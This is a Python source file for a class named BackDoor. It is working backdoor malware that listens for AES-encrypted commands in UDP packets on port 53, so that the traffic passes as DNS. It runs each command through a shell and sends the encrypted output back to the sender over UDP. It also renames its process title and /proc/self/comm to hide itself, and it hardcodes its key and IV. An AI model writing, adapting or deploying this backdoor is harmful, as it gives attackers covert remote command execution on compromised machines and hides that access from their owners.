from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.layers.inet import UDP, IP
from scapy.all import sniff, send
from scapy.volatile import RandShort
from subprocess import run
import sys
import os
import setproctitle

class BackDoor:
    def __init__(self):
        print("Backdoor has been initiated")
        self.key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
        self.iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'
        self.flag_begin = "****["
        self.flag_close = "]****"
        self.port = 53
        self.client_port = 8888
        self.client = ""
        self.masked_name = "MASKED_PROCESS"

    def start(self):
        self.hide_process()
        print("Starting.....")
        print("Listening for packets")
        print("--------------------------------------------------------------")
        self.sniff_init()


    def craft_packet(self, msg: str):
        ip = IP(dst=self.client)
        udp = UDP(sport=RandShort(), dport=self.client_port)
        payload = msg
        pkt = ip / udp / payload
        try:
            print("Sending output back to client")
            print("--------------------------------------------------------------")
            print("--------------------------------------------------------------")
            send(pkt, verbose=0)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def prepare_msg(self, cmd: str) -> str:
        cipher = self.generate_cipher()
        encrypted_data = self.encrypt_data(cipher, cmd)
        # Convert the encrypted string to bytes

        print(f"Encrypted format: {encrypted_data}")
        hex_str = self.get_hex_string(encrypted_data)
        print("--------------------------------------------------------------")
        msg = self.flag_begin + hex_str + self.flag_close
        print(f"Added flags, sending: {msg}")
        return msg


    def get_hex_string(self, encrypted_line):
        """ Returns hex string of byte stream (encrypted string)"""
        return encrypted_line.hex()

    def sniff_init(self) -> None:
        try:
            sniff(filter="udp", prn=lambda p: self.filter_packets(p), store=False)
        except PermissionError:
            print("Permission error! Run as sudo or admin!")
            sys.exit()

    def process_packets(self, data: str) -> None:
        stripped_msg = data.strip(self.flag_begin).rstrip(self.flag_close)
        decrypted_msg = self.decrypt_data(stripped_msg)
        print(f"Executing: {decrypted_msg}")
        self.execute(decrypted_msg)


    def execute(self, cmd: str) -> None:
        output = run(cmd, shell=True, capture_output=True, text=True)
        output = output.stdout
        msg = self.prepare_msg(output)
        self.craft_packet(msg)

    def filter_packets(self, packet) -> None:
        try:
            msg = packet[UDP].load.decode()
            if UDP in packet and msg.startswith(self.flag_begin) \
                    and msg.endswith(self.flag_close) and packet[UDP].dport == self.port:
                print(f"Received authenticated packet: {msg}")
                if not self.client:
                    self.set_client(packet[IP].src)
                self.process_packets(msg)
        except:
            return

    def set_client(self, ip):
        print(f"Setting client ip as {ip}")
        self.client = ip

    def decrypt_data(self, encrypted_msg: str) -> str:
        encrypted_byte_stream = bytes.fromhex(encrypted_msg)
        cipher = self.generate_cipher()
        # Initialize a decryptor object
        decryptor = cipher.decryptor()
        # Initialize an unpadder object
        unpadder = padding.PKCS7(128).unpadder()
        # Decrypt and remove padding
        padded_message = decryptor.update(encrypted_byte_stream) + decryptor.finalize()
        msg = unpadder.update(padded_message) + unpadder.finalize()
        msg = msg.decode()
        print(f"Decrypted message: {msg}")
        return msg

    def encrypt_data(self, cipher, line) -> bytes:
        """Encrypts message"""
        encryptor = cipher.encryptor()
        # Padding needed at AES requires specific byte size.
        # Allows for custom length messages.
        padder = padding.PKCS7(128).padder()
        padded_line = padder.update(line.encode()) + padder.finalize()
        encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
        return encrypted_line

    def set_hex(self):
        self.hex_data = ""

    def generate_cipher(self) -> Cipher:
        """Generates cipher for encryption"""
        return Cipher(algorithms.AES(self.key), modes.CBC(self.iv))

    def hide_process(self):
        setproctitle.setproctitle(f"{self.masked_name}")
        with open("/proc/self/comm", "w") as f:
            f.write(self.masked_name)
